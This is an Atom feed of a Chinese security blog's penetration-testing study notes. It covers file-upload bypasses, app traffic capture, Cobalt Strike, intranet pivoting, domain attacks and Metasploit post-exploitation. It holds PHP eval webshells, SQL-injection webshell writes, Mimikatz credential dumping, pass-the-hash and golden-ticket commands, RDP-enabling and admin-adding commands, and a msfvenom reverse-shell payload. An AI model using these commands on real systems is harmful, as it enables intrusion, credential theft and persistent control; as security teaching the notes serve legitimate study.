<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DtxのRealm</title>
  
  <subtitle>HackerStuff</subtitle>
  <link href="https://dtxharry.github.io/atom.xml" rel="self"/>
  
  <link href="https://dtxharry.github.io/"/>
  <updated>2023-08-21T15:35:01.734Z</updated>
  <id>https://dtxharry.github.io/</id>
  
  <author>
    <name>dtxHarry</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件上传漏洞</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-08-21T09:02:08.000Z</published>
    <updated>2023-08-21T15:35:01.734Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传漏洞：<br>    <strong>文件上传 是 功能</strong><br>    文件上传 =&gt; 任意文件上传漏洞（对了一半）<br>    文件上传 =&gt; 可以上传<strong>恶意</strong>文件（php\后端脚本）</p><p>上传网站木马（Webshell 一句话木马）</p><p>上传恶意文件，他开始和我们斗智斗勇。</p><h1 id="上传方法"><a href="#上传方法" class="headerlink" title="上传方法:"></a>上传方法:</h1><h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测:"></a>前端检测:</h2><p><strong>计算机一般是根据文件后缀来判断文件类型的</strong>。<br>前端检测：用前端代码检测（JS）  等于 没有检测<br>    1、删除检测代码（F12不能直接删 Burp法）<br>    2、不让JS执行（立杆见影）<br>    3、上传.jpg文件，然后抓包改成PHP（标准方法）</p><form method='POST' enctype="multipart/form-data"><input type='file' name='a' /><input type='submit' /></form><p>&lt;?php var_dump($_FILES);?&gt;</p><p>array(1) { [“a”]=&gt; array(5) { [“name”]=&gt; string(7) “123.php” [“type”]=&gt; string(24) “application/octet-stream” [“tmp_name”]=&gt; string(45) “C:\Users\admin\AppData\Local\Temp\php2827.tmp” [“error”]=&gt; int(0) [“size”]=&gt; int(26) } }</p><p>name 上传文件名<br>type 上传文件类型标识（浏览器给的）<br>tmp_name 上传文件的临时文件（文件上传 到目标的临时目录里面，然后通过代码移动重命名到你想放的地方)<br>size 大小</p><p>move_uploaded_file 移动上传文件</p><p>黑名单：名单上的某某某禁止<br>白名单：只有名单上的某某某可以做 .php</p><h2 id="黑名单机制"><a href="#黑名单机制" class="headerlink" title="黑名单机制:"></a>黑名单机制:</h2><p><strong>php结尾才能当作php执行 php phtml php3 php4 php5</strong></p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p> 分布式配置文件（针对不同文件夹有不同的规则 伪静态 默认不开启）</p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>不常见（主要：window服务器上有 大小写不敏感）</p><h3 id="php-php空格"><a href="#php-php空格" class="headerlink" title="php / php空格"></a>php / php空格</h3><p>不同的服务器命名文件的时候会自动删除空格、点</p><p>黄飞 / 黄飞鸿</p><h3 id="循环检测"><a href="#循环检测" class="headerlink" title="循环检测"></a>循环检测</h3><p>：pphphp</p><h3 id="文件流绕过"><a href="#文件流绕过" class="headerlink" title="文件流绕过"></a>文件流绕过</h3><p>：一个文件可以有多个文件流</p><p>文件名 = 文件名::$DATA</p><h2 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制:"></a>白名单机制:</h2><h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>​    源于电报。  over 确定我自己话说完了 标识符：这个话说完了</p><p>当数据传输的时候，出现00字符代表，这个数据内容的结束</p><p>PHP中低版本 PHP 5.3&lt;<br>move_uploaded_file</p><p>​    ../upload/1.php%00/2920220818201302.jpg<br>​<br><a href="http://zmie8016.ia.aqlab.cn/upload/2920220818201302.jpg">http://zmie8016.ia.aqlab.cn/upload/2920220818201302.jpg</a><br><a href="http://zmie8016.ia.aqlab.cn/UP5020220818201500.jpg">http://zmie8016.ia.aqlab.cn/UP5020220818201500.jpg</a></p><p>图床（第三方图床 七牛云、阿里云、微博） 防止文件上传漏洞最有效的方法</p><p>​    A 运行网站<br>​    B 啥都不装，装一个web容器，然后专门负责存放图片和文件</p><p>根据信息安全管理条例，很多敏感信息是绝对不能放图床<br>to G 端 图传偏少 [互联网公司图床多]<br>a 61</p><p>之前所有题目检测核心后缀</p><p>13关开始，检测图片  </p><h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>-图片和木马的结合<br>    <strong>要做图片马的图片，越小越好</strong><br>    而且本地测试成功再使用</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">2</span>.txt <span class="number">99</span>.jpg</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">夹心图片马：图 + 马 + 图</span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.jpg/b + <span class="number">2</span>.txt <span class="number">99</span>.jpg（末尾是&lt;?php?&gt;）</span><br><span class="line"><span class="built_in">copy</span> <span class="number">99</span>.jpg/b + <span class="number">1</span>.jpg/b <span class="number">88</span>.jpg =&gt; 显示的都是<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure><p>​    copy的好玩法 藏文件</p><p>​    二次渲染绕过 (我把你的图片重新做一下)<br>​    图片有一些基础属性是无法改变的<br>​    绕二次渲染，jpg难 png难 gif动图</p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>​        先上车 后买票<br>​        先买票 后上车</p><p>​        先检测 还是 先上传</p><p>​        1、检测，上传<br>​        2、上传，检测，不通过删除 （存在条件竞争）</p><p>​        上传 -&gt; 检测 -&gt; 删除<br>​        1        1        1</p><p>​        那么我们如果在删除前访问到文件，是不是代码就执行了</p><p>​        马 生 马 =&gt; A木马运行生出B木马        </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contens</span>(<span class="string">&#x27;abc.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_REQUEST[8])?&gt;&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​        单身300年的手速，手是搓不出来，需要暴破模块</p><p>​        一直上传、一直访问</p><p>​        <a href="http://192.168.1.4/upload/1.php">http://192.168.1.4/upload/1.php</a></p><h1 id="IIS6-0解析漏洞-gt"><a href="#IIS6-0解析漏洞-gt" class="headerlink" title="IIS6.0解析漏洞 =&gt;"></a>IIS6.0解析漏洞 =&gt;</h1><p>IIS6.0 =&gt; IIS6.0(Web容器) IIS APACHE NGINX<br>解析漏洞 =&gt; 解析（上传[把木马放到可以访问到的根目录]）<br>    =&gt; .php  .jpg(交给jpg处理)  我们可以根据漏洞，用特殊的访问手法或者特殊的后缀名会被当作后端代码执行<br>    (.htaccess)</p><p>IIS6.0 =&gt; windows server 2003 的全版本都默认安装自带IIS6.0(ASP)</p><p>.asp 会被当作asp文件处理<br>.jpg 会被当作jpg文件处理<br>    =&gt; 后缀调用的文件</p><p>1、asa cdx cer 都会当作asp执行（微软认为不是漏洞，是特殊的默认配置<br>2、特殊符号影响：test.asp;.jpg   test.asp/123.jpg<br>3、CGI解析漏洞（PHP和Web容器的通信方法）  任何文件后面加/1.php</p>]]></content>
    
    
    <summary type="html">比较详细的介绍了文件上传漏洞的利用方式</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="文件上传漏洞" scheme="https://dtxharry.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>App渗透</title>
    <link href="https://dtxharry.github.io/2023/08/21/App%E6%B8%97%E9%80%8F/"/>
    <id>https://dtxharry.github.io/2023/08/21/App%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-21T09:02:01.000Z</published>
    <updated>2023-08-22T01:37:30.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是App渗透"><a href="#什么是App渗透" class="headerlink" title="什么是App渗透"></a>什么是App渗透</h1><p><strong>App渗透测试 和 Web渗透测试，基本没有区别</strong></p><p>XSS SQL注入 文件上传 支付漏洞 验证码绕过 SSRF 等常见漏洞，App都有。</p><p>app传输到目标得数据 =&gt; 走的还是HTTP，后端代码，开发逻辑是相同。</p><p>Web =&gt; 用浏览器访问网站<br>App =&gt; 用app来访问目标<br>客户端 =&gt; 菜刀(exe)访问目标</p><p><strong>最早的、最简单app其实就是内置浏览器封装</strong>(现在还能在线生成这种封装App)</p><h1 id="用模拟器进行App渗透"><a href="#用模拟器进行App渗透" class="headerlink" title="用模拟器进行App渗透"></a>用模拟器进行App渗透</h1><p>安卓虚拟机 =&gt; 安卓模拟器<br>    夜神、雷电、UU、各种各样的<br>    雷电的高版本抓包有问题<br>        做app渗透测试最好用安卓7.0以下的模拟器<br>        对于用户的自安装的证书并不信任</p><p>Web渗透的核心？ =&gt; 控制传参 GET POST<br>APP渗透的核心？ =&gt; 控制传参  抓包</p><hr><p>如何给模拟器抓包：<br>    设置代理<br>    der证书 模拟器装不了 （cer）</p><p>​    139.159.239.31/gdqg/api/pubapi/index.php?table=shequ&amp;keyname=articletype&amp;keycontent=luntan</p><p>​    —-</p><p><strong>加密不要害怕：</strong><br>        1、网页端：分析JS代码。解决80%<br>        2、app: 加密在app的源码里。（比较麻烦了，逆向）</p><p>​    未来的趋势：<br>​        1、Javascript / node.js npm<br>​        2、Java<br>​        3、Go 或者 Python (ChatGPT)</p><p>​        </p><hr><p>常见的防抓包方法：<br>    有攻击必然有防御：<br>        防御：<br>            1、没有漏洞（不可能的事情）<br>            2、不让你抓包（很难测试）<br>            3、抓包了让你看不懂（加密传参）=&gt; App逆向和脱壳还有HOOK</p><p>防抓包的方法的原理解析<br>    1、证书校验（其实就是https，我们用burp的证书就可以绕过）</p><p>2、代理屏蔽（使用okhttp框架，里面可以设置无代理模式，不走系统代理）最常见<br>    不用系统代理，我们用VPN代理<br>3、单向认证，证书绑定（SSL pinning 单边校验）<br>4、双向认证（安卓并不是很常见）</p><hr><p>开源监控系统：sentry</p><p>越权漏洞 =&gt; 注册两个账号来传这个参</p><hr><h3 id="单向认证："><a href="#单向认证：" class="headerlink" title="单向认证："></a>单向认证：</h3><p>​    app内置了一本证书。App会检测，通信的时候用的证书和我内置是否相同</p><p>​    app -&gt; Burp -&gt; 目标<br>​       A证书     B证书</p><p>​       1、逆向捞证书<br>​       2、Hook<br>​               代码执行到这里不往下执行了了就是断点。<br>​               app的代码里负责证书校验的代码，给他替换掉，永远返回真</p><p>​           你得会安卓编程、逆向，能砸壳，看源码（App代码审计）<br>​               JustTrustMe 自动HOOK， 单向认证</p>]]></content>
    
    
    <summary type="html">介绍App如何抓包如何进行渗透(未完)</summary>
    
    
    
    <category term="web渗透" scheme="https://dtxharry.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
    
    <category term="App渗透" scheme="https://dtxharry.github.io/categories/App%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="App渗透" scheme="https://dtxharry.github.io/tags/App%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt_Strike(CS)</title>
    <link href="https://dtxharry.github.io/2023/08/21/Cobalt-Strike-CS/"/>
    <id>https://dtxharry.github.io/2023/08/21/Cobalt-Strike-CS/</id>
    <published>2023-08-21T08:53:17.000Z</published>
    <updated>2023-08-21T15:26:15.719Z</updated>
    
    <content type="html"><![CDATA[<p>渗透测试神器 - Cobalt Strike</p><h1 id="Cobalt-Strike-工具"><a href="#Cobalt-Strike-工具" class="headerlink" title="Cobalt Strike 工具"></a>Cobalt Strike 工具</h1><pre><code> 内网渗透[后渗透]神器（远控） CS可以团队作战  官网地址：https://www.cobaltstrike.com/（付费软件）</code></pre><h2 id="CS优势"><a href="#CS优势" class="headerlink" title="CS优势:"></a>CS优势:</h2><h3 id="团队协作："><a href="#团队协作：" class="headerlink" title="团队协作："></a>团队协作：</h3><p>​        可以多人合作完成渗透</p><h3 id="跳板的功能"><a href="#跳板的功能" class="headerlink" title="跳板的功能"></a>跳板的功能</h3><p>​            CS分为两个部分。服务端、客户端</p><p>​                服务端 - 架设在服务器上<br>​                客户端 - 在攻击者本机上</p><p>​        溯源也只能溯源到服务端，无法溯源到攻击者<br>​        同一个CS，不同的用户，多地点登录权限相同</p><h3 id="不间断监听"><a href="#不间断监听" class="headerlink" title="不间断监听"></a>不间断监听</h3><p>​            MSF会存在一个问题：<br>​                如果目标运行了木马，你的MSF监听没开启、电脑没开、没网。也没有意义<br>​                服务器 =&gt; 24小时不关机、不断网的主机</p><h2 id="运行CS"><a href="#运行CS" class="headerlink" title="运行CS:"></a>运行CS:</h2><h3 id="运行服务端-gt"><a href="#运行服务端-gt" class="headerlink" title="运行服务端 =&gt;"></a>运行服务端 =&gt;</h3><p> 管理员模式 =&gt; 填ip =&gt; 填密码<br>        CS服务端默认端口<strong>50050</strong></p><h3 id="启动客户端-gt"><a href="#启动客户端-gt" class="headerlink" title="启动客户端 =&gt;"></a>启动客户端 =&gt;</h3><p>​        后渗透神器、远控程序</p><h4 id="1、设置监听"><a href="#1、设置监听" class="headerlink" title="1、设置监听"></a>1、设置监听</h4><h4 id="2、制作木马"><a href="#2、制作木马" class="headerlink" title="2、制作木马"></a>2、制作木马</h4><h4 id="3、上线"><a href="#3、上线" class="headerlink" title="3、上线"></a>3、上线</h4><p>​            改变<strong>心跳包</strong>时间 默认是60(心跳包:因为http不是一直连接的,所以要定期连一下同步信息)</p><p>​        exe 木马</p><p>​        =&gt; 宏病毒 （针对于office的病毒）<br>​        =&gt; 你打开了一个陌生的word xls<br>​        =&gt; WPS无法上线宏 [宏是WPS的收费功能，不付钱没有]</p><p>​    进程注入=&gt;</p><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>1、持久控制：开机自启木马<br>        一、任务计划程序<br>        二、服务运行 管理员才能生成服务<br>            SYSTEM 是计算机中最高的权限<br>    2、CS插件：让CS功能更加强大<br>        <a href="https://blog.csdn.net/ZPFCD/article/details/125824127">https://blog.csdn.net/ZPFCD/article/details/125824127</a></p><p>​    &lt;?php eval(decode_base64($_REQUEST[7]))?&gt;</p><p>​    7=phpinfo();<br>​    =&gt;cGhwaW5mbygpOw==</p><p>​    加密数据：<br>​        https<br>​        走UDP代码<br>​        走icmp<br>​        改马，上AES RSA加密</p><p>​        exe正常情况下改不了，编译后的产物<br>​        逆向：OD、ida =&gt; 把exe转换为汇编</p><p>​        echo “Hello” =&gt;   100行-200行 500 1000行</p>]]></content>
    
    
    <summary type="html">一款经典的远控工具</summary>
    
    
    
    <category term="内网渗透" scheme="https://dtxharry.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透工具" scheme="https://dtxharry.github.io/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="木马" scheme="https://dtxharry.github.io/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="远控" scheme="https://dtxharry.github.io/tags/%E8%BF%9C%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-21T08:51:15.000Z</published>
    <updated>2023-08-21T15:21:15.362Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入：拿到了数据库信息、拿到了管理员账号密码。然后找不到后台。<br>SQL注入  Getshell =&gt; DNS注入的课程<br>    <strong>into dumpfile</strong>  =&gt; 将SQL语句执行结果导出到XXX文件<br>    <strong>into outfile</strong>      =&gt; 将SQL语句执行结果导出到XXX文件<br>        into dumpfile ‘c:/phpstudy/www/77.php’</p><p>想让目标报错，最简单的办法 id<strong>[]</strong>=1<br>        2 and 1=2  union select 1,’&lt;?php eval($_REQUEST[8])?&gt;’ into dumpfile ‘c:/phpstudy/www/78.php’</p><h1 id="判断自己的账号是否是管理员"><a href="#判断自己的账号是否是管理员" class="headerlink" title="判断自己的账号是否是管理员"></a>判断自己的账号是否是管理员</h1><p>​        net localgroup administrators</p><h1 id="提权（低权限用技术手段弄成高权限）"><a href="#提权（低权限用技术手段弄成高权限）" class="headerlink" title="提权（低权限用技术手段弄成高权限）"></a>提权（低权限用技术手段弄成高权限）</h1><h2 id="第三方应用提权："><a href="#第三方应用提权：" class="headerlink" title="第三方应用提权："></a>第三方应用提权：</h2><p>​            Mysql是高权限（UDF提权）<br>​            PHP是低权限 =&gt; 用PHP去操作Mysql,然后让mysql帮我执行恶意命令</p><h2 id="系统漏洞提权法："><a href="#系统漏洞提权法：" class="headerlink" title="系统漏洞提权法："></a>系统漏洞提权法：</h2><p>​        操作系统也会有漏洞？<br>​        操作系统漏洞没学过，而且就算写了文章给你，你也不会呀。</p><p>​         Microsoft Windows Server 2008 R2 Standard </p><p>​         <a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p><h1 id="把用户加入管理员组"><a href="#把用户加入管理员组" class="headerlink" title="把用户加入管理员组"></a>把用户加入管理员组</h1><p>​        net localgroup administrators a /add</p><p><strong>一个Ip下可能有几个机器：一定是1个吗？很多很多个</strong></p><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="1、正向连接："><a href="#1、正向连接：" class="headerlink" title="1、正向连接："></a>1、正向连接：</h2><p>​        webshell传递的数据有限，你想连接3389,想走数据webshell干不到</p><p>​        设置中转站：</p><p>​            我 -&gt; 目标的一个PHP文件 -&gt; 让目标去帮我的发起网络请求</p><p>​            PHP很强大，他可以发起网络请求吗？ 可以 </p><h3 id="如何让远程桌面的数据请求发到中转PHP上？"><a href="#如何让远程桌面的数据请求发到中转PHP上？" class="headerlink" title="如何让远程桌面的数据请求发到中转PHP上？"></a>如何让远程桌面的数据请求发到中转PHP上？</h3><p>​                1、本地设置代理，把数据转到本地的某个端口<br>​                2、做转接，监听某个端口，然后将端口的数据发送到中转PHP上</p><p>​            <strong>远程连接：127.0.0.1 不可以连接</strong><br>​            </p><h2 id="2、反向连接（反弹shell，木马）-目标"><a href="#2、反向连接（反弹shell，木马）-目标" class="headerlink" title="2、反向连接（反弹shell，木马） 目标"></a>2、反向连接（反弹shell，木马） 目标</h2><p>​            <strong>必须有网</strong><br>​            上网代表的是：插了网线，连接了互联网<br>​            有网：他可以主动去请求别人，并且可以通</p><h2 id="3-正反连接选择"><a href="#3-正反连接选择" class="headerlink" title="3.     正反连接选择"></a>3.     正反连接选择</h2><p>​                反向连接要开VNC -  真实渗透，哪有人会直接远程桌面连接，这么大的动静<br>​                正向连接法，哪怕目标没有开启3389服务，你可以给他开<br>​                REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br>​                </p><p>​            netsh firewall add portopening protocol = TCP port = 3389 name = rdp</p><h1 id="内网渗透：渗透内网的机器？"><a href="#内网渗透：渗透内网的机器？" class="headerlink" title="内网渗透：渗透内网的机器？"></a>内网渗透：渗透内网的机器？</h1><p>​        重要的数据是不会放在网站上的，他应该放在内网里。<br>​        <strong>安全环境是：外紧内松 =&gt; 内网里面可以搞出很多东西</strong></p><p>​            云WAF\设备防护 =&gt; 正常渗透的时候会防护你、内网渗透不会<br>​            安全设备是架设在网络入口的</p><p>​        1、和web一样（端口扫描、网站测试）<br>​        2、端口扫描砸0day (永恒之蓝)<br>​        3、信息收集，找密码<br>​            内网里面的机器，可不可能同一个密码多个服务器使用？<br>​            密码是可以抓的，windows的密码是可以抓的<br>​            法国神器（猕猴桃）</p><p>​            提升权限：privilege::debug<br>​            抓密码：sekurlsa::logonpasswords </p><p>​            目标有什么主机。<br>​            直接给他装nmap ，直接开扫</p><p>​            为什么抓到的密码是明文：<br>​                windows的低版本他就是明文的。<br>​                高版本他不是，但是也可以有利用方式（PTH）</p><h1 id="内网渗透-域渗透"><a href="#内网渗透-域渗透" class="headerlink" title="内网渗透:域渗透"></a>内网渗透:域渗透</h1><h2 id="域："><a href="#域：" class="headerlink" title="域："></a>域：</h2><p>​            控制机：DC 域里面的管理员，权限极高，可以控制任意成员机<br>​            成员机：被控的小弟弟，只能被域控控制</p><p>​    内网渗透的最高目的：拿下域控（域：200台机器。你只要拿下域控，200台机器都是你的）</p><p>安装一个域。<br>        不知道密码如何更换： net user 用户名 密码</p><h2 id="林"><a href="#林" class="headerlink" title="林:"></a>林:</h2><p>​    林 =&gt; 多个域组成林 =&gt; 1个域也是1个林</p><p>​    <strong>1台成员机只可以加1个域，但是一个域可以多个域控</strong></p><p>​    设置一个域名： 他是内网用的域名，所以可以随便写 qq.com</p><p>​    这个qq.com是干什么？<br>​    其实每个域成员机，加入域控都会有自己的名字(域名，内网中的)<br>​    dc.qq.com<br>​    a1.qq.com<br>​    a45.qq.com<br>​    s3.qq.com<br>​    m2c.qq.com</p><p>​    内网中的域名，优先级是高于外网。<br>​    我们是不是需要在内网中搭建DNS服务器。</p><h3 id="如何知道目标是否在域中"><a href="#如何知道目标是否在域中" class="headerlink" title="如何知道目标是否在域中"></a>如何知道目标是否在域中</h3><p>​    <strong>systeminfo</strong><br>​        域:WORKGROUP 不在域中<br>​        域中：域名  zkaq.cn</p><p>​            主机是域，会寻找域控，因为域控一般会搭建DNS服务器</p><p>​            需要给目录服务还原模式设置：A1B2C3123456.</p><p>​        域控：10.0.1.6</p><p>​        域控的管理员账号 是可以 登录任意域主机</p><p>​        如果域控的账号密码，登陆过目标机器？那是不是有方法获取？</p><p>​        加入域的时候，填写的账户名和密码，是域控的账户名字和密码</p><p>​        域访问：是需要标识</p><p>​        正常情况下来说：<br>​            本地的账户密码 可以进入本机<br>​            域控的账户密码 也可进入域内主机</p><h2 id="猕猴桃抓域控"><a href="#猕猴桃抓域控" class="headerlink" title="猕猴桃抓域控"></a>猕猴桃抓域控</h2><p>看不到明文密码。因为windows高版本都看不到，也可以打个补丁让人看不到。</p><h3 id="1、哈希破解法"><a href="#1、哈希破解法" class="headerlink" title="1、哈希破解法"></a>1、哈希破解法</h3><p>​                根据windows的自带算法算出来的</p><ul><li>NTLM     : 61465a991b168727b65b3644aab823cd<br>SHA1     : 5b48c7f5a5facbb5df950bb501b9da8dcd86db3d<pre><code>    我拿一本弱密码字典，我也可以通过windows的算法去算。算出来的值和密文的就是密码(为什么不直接暴破3389?速度慢[hashcat])</code></pre></li></ul><h3 id="2、哈希传递法【pth】"><a href="#2、哈希传递法【pth】" class="headerlink" title="2、哈希传递法【pth】"></a>2、哈希传递法【pth】</h3><p>​            数据库是存明文密码、密文密码。<br>​            所以理论上而言，你传密文密码，和数据库校验的时候是可以通过<br>​            找到一个，可以和目标交互，可以用密文交互登录的地方就可以用它账号了[windows是有的]</p><p>​    sekurlsa::pth /user:administrator /domain:”zkaq.cn” /ntlm:61465a991b168727b65b3644aab823cd </p><p>​    哈希传递拿下域控</p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>​    黄金票据 =&gt; 通信证<br>​    我们正常的登录是需要通过账号密码校验。我们哈希传递之后，我们拿到了的cmd【渗透测试一般不会直接加账号】<br>​    我们怎么长久控制？ 只要他修改了密码，你就不能哈希传递<br>​    做通信证，直接不用过账号密码。</p><p>​    lsadump::dcsync /user:krbtgt  </p><p>​        获取krbtgt账户的信息（域安装的默认账号）</p><p>​        Hash NTLM: 9f7afad7acc9f72b7e338b908795b7da<br>​        Object Security ID   : S-1-5-21-4098506371-3349406080-1400905760-502<br>​        Object Relative ID   : 502</p><p>​        kerberos::golden /admin:administrator /domain:zkaq.cn /sid:S-1-5-21-4098506371-3349406080-1400905760 /krbtgt:9f7afad7acc9f72b7e338b908795b7da /ticket:411.kiribi  </p><p>​        用票据去访问，得域名</p><p>​        krbtgt 这个域控服务所需账号进的</p>]]></content>
    
    
    <summary type="html">比较详细的一些内网渗透的笔记</summary>
    
    
    
    <category term="内网渗透" scheme="https://dtxharry.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="提权" scheme="https://dtxharry.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="内网渗透" scheme="https://dtxharry.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="域控" scheme="https://dtxharry.github.io/tags/%E5%9F%9F%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>msf后渗透</title>
    <link href="https://dtxharry.github.io/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    <id>https://dtxharry.github.io/2023/08/21/msf%E5%90%8E%E6%B8%97%E9%80%8F/</id>
    <published>2023-08-21T08:50:47.000Z</published>
    <updated>2023-08-22T01:36:44.638Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpstudy +  phpmyadmin 4.8.1 </p><p>创建用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user www admin@123 /add</span><br><span class="line">net localgroup administrators 账号 /add # 添加权限</span><br></pre></td></tr></table></figure><p><img src="C:\Users\rubik\Desktop\msfpost\img\1.png" alt=""></p><p>设置的漏洞点: 远程文件包含</p><p>80端口被占用问题:</p><p><img src="C:\Users\rubik\Desktop\msfpost\img\2.png" alt=""></p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>爆破：</p><p>攻击模块：auxiliary/scanner/http/phpmyadmin_login  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali自带字典</span><br><span class="line">/usr/share/dirb/wordlists/ </span><br><span class="line">/usr/share/wordlists/</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br></pre></td></tr></table></figure><p>远程文件包含：</p><p>使用的模块：exploit/multi/http/phpmyadmin_lfi_rce </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">php/meterpreter/reverse_tcp# 功能不全面，执可执行的命令较少</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>网站的根目录： www/</p><p>192.168.226.173/phpinf.php</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li><p>借助其他的工具来进行操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getwd # 确认当前目录 </span><br><span class="line">edit 1.php # 使用的是vim的编辑。i：进入编辑模式  esc：退出编辑模式  :wq ：保存退出 </span><br></pre></td></tr></table></figure></li></ol><ol><li>直接通过msf进行操作</li></ol><p>​        生成新的后门文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.226.128 lport=1234 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">use post/multi/recon/local_exploit_suggester # 查看能用的漏洞 (有时候可能会失败.)</span><br><span class="line"></span><br><span class="line">use exploit/windows/local/ms16_075_reflection_juicy # 提权模块</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>linux命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano # 查看端口</span><br></pre></td></tr></table></figure><p>反弹shell:</p><p>自己 ——-&gt; 目标服务器</p><p>目标服务器 ——-&gt; 自己  反向链接出来的shell,就叫反弹shell </p><h2 id="常用的提权方式："><a href="#常用的提权方式：" class="headerlink" title="常用的提权方式："></a>常用的提权方式：</h2><ol><li><p>利用运行的应用漏洞提权 （限制条件比较多）</p></li><li><p>利用系统漏洞进行提权。</p><ol><li><p>系统补丁 （没打补丁能利用的点）</p><p>根据提供的漏洞补丁的数量.</p><p>去除掉已经打了补丁的漏洞. 然后显示常见的其他的可利用的漏洞</p><p>没打补丁、意味着可能漏洞是能被利用的。所以我们就可以根据补丁数量，去判断有没有可用的点</p><p>补丁通常是需要自己去打,安全工具,只是能识别出攻击流量.然后ban掉这些流量</p></li></ol></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo 查看到当前系统的补丁信息</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">介绍如何用msf后渗透例如提权</summary>
    
    
    
